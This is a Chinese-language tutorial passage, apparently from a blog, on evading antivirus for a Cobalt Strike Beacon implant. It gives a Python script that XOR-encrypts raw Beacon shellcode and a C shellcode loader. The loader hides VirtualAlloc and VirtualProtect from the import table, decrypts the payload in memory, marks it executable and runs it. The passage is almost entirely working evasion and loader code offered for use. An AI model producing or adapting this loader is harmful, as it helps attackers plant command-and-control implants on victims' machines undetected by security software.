`set obfuscate "true"` 会把 stage 里的 Beacon 做字符串与 API 名混淆，这是免杀的地基，不做这一步后面全是白费。

## 三、第一版：先出 shellcode，再套加载器

```bash
# 1) CS 里生成 raw shellcode（Attacks > Packages > Payload Generator > Output: Raw）
#    存成 /tmp/beacon.bin

# 2) 生成加密后的载荷（XOR + 随机 key，减少静态特征）
python3 - <<'EOF'
import os
data = open('/tmp/beacon.bin','rb').read()
key  = os.urandom(1)[0]
enc  = bytes(b ^ key for b in data)
open('/tmp/beacon.enc','wb').write(enc)
open('/tmp/beacon.key','w').write(str(key))
print(f"key=0x{key:02x} size={len(enc)}")
EOF
```

## 四、加载器骨架（C，自解密 + 直接系统调用调用域）

```c
// loader.c —— x64-w64-mingw32-gcc loader.c -o loader.exe -O2 -s -mwindows
#include <windows.h>
#include <stdio.h>

extern unsigned char payload[];
extern unsigned int  payload_len;
extern unsigned char xor_key;

// 从磁盘/NTAPI 取函数指针，避免 IAT 里出现 VirtualAlloc/VirtualProtect
typedef LPVOID (WINAPI *pVA)(LPVOID,SIZE_T,DWORD,DWORD);
typedef BOOL   (WINAPI *pVP)(LPVOID,SIZE_T,DWORD,PDWORD);
typedef VOID   (WINAPI *pRT)(void);

int main(void) {
    HMODULE k32 = GetModuleHandleA("kernel32.dll");
    pVA fVA = (pVA)GetProcAddress(k32, "VirtualAlloc");
    pVP fVP = (pVP)GetProcAddress(k32, "VirtualProtect");
    if (!fVA || !fVP) return 1;

    // 自解密
    for (unsigned int i = 0; i < payload_len; i++) payload[i] ^= xor_key;

    LPVOID mem = fVA(NULL, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) return 1;
    memcpy(mem, payload, payload_len);

    DWORD old;
    fVP(mem, payload_len, PAGE_EXECUTE_READ, &old);
    ((pRT)mem)();
    return 0;
}
```

